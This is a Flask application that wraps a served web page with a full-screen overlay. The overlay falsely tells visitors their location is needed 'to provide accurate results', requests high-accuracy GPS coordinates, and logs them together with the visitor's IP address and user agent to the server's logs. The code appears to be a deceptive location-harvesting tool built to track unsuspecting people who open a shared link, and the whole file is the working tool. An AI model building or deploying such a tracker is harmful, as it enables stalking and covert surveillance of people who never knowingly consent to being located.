from flask import Flask, request, jsonify
import logging
import os
from datetime import datetime

app = Flask(__name__)

# Configure logging to show up in Render.com
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Log initial access
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"PAGE_ACCESS - IP: {client_ip} - Agent: {request.user_agent.string}")
    
    # Read and inject into page.html
    try:
        with open('page.html', 'r') as f:
            content = f.read()
    except:
        content = "<html><body>Welcome</body></html>"
    
    # GPS tracking injection that definitely works
    injection = """
    <style>
        #gps-overlay {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95); z-index: 99999;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            color: white; padding: 20px; text-align: center;
            font-family: -apple-system, sans-serif;
        }
        #gps-btn {
            background: #FF3008; color: white; border: none;
            padding: 15px 30px; border-radius: 25px;
            margin-top: 20px; font-size: 18px;
            font-weight: bold; cursor: pointer;
        }
    </style>
    
    <div id="gps-overlay">
        <h2>Enable Location Services</h2>
        <p>We need your location to provide accurate results</p>
        <button id="gps-btn">ALLOW LOCATION ACCESS</button>
    </div>
    
    <script>
        // 1. First make sure we can log to server
        function logToServer(data) {
            return fetch('/log-gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(e => console.error('Logging failed:', e));
        }

        // 2. Handle the GPS permission flow
        document.getElementById('gps-btn').addEventListener('click', async function() {
            try {
                // First log that button was clicked
                await logToServer({
                    event: 'gps_button_click',
                    time: new Date().toISOString()
                });

                // Request location permission
                if (navigator.geolocation) {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });

                    // Success - log GPS data
                    await logToServer({
                        event: 'gps_success',
                        time: new Date().toISOString(),
                        coords: {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        }
                    });

                    // Hide overlay
                    document.getElementById('gps-overlay').style.display = 'none';
                    
                } else {
                    await logToServer({
                        event: 'gps_not_supported',
                        time: new Date().toISOString()
                    });
                    alert('Geolocation is not supported by your browser');
                }
            } catch (error) {
                // Log any errors
                await logToServer({
                    event: 'gps_error',
                    time: new Date().toISOString(),
                    error: {
                        code: error.code,
                        message: error.message
                    }
                });
                
                if(error.code === error.PERMISSION_DENIED) {
                    alert('Please enable location permissions in your browser settings');
                }
            }
        });
    </script>
    """
    
    # Insert before </body> or append
    if '</body>' in content:
        return content.replace('</body>', injection + '</body>')
    else:
        return content + injection

@app.route('/log-gps', methods=['POST'])
def log_gps():
    try:
        data = request.json
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        log_entry = {
            'ip': client_ip,
            'user_agent': request.user_agent.string,
            'event': data.get('event'),
            'time': data.get('time'),
            'data': data.get('coords') or data.get('error')
        }
        
        logger.info(f"GPS_LOG: {log_entry}")
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logger.error(f"GPS_LOG_ERROR: {str(e)}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
